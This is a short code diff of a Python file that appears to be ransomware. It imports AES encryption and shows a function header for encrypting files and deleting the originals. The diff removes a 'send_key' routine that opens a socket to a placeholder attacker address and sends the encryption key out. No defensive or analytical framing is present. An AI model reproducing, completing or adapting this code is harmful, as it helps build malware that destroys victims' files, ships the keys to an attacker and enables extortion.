@@ -1,23 +1,10 @@
 import os
-import socket
 import getpass
 import platform
 import hashlib
 from Crypto.Cipher import AES
 from Crypto.Random import get_random_bytes
 from Crypto.Util.Padding import pad
-
-# We create a socket to send the encryption key to a remote server
-def send_key(key):
-    host = "YOUR IP ADDRESS"
-    port = YOUR PORT
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((host, port))
-    s.send(key)
-    print("Key sent")
-    s.send(b"DONE")
-    s.shutdown(2)
-    s.close()
 
 # Function to encrypt a file and removing the unencrypted one
 def encrypt_file(file, key, iv):
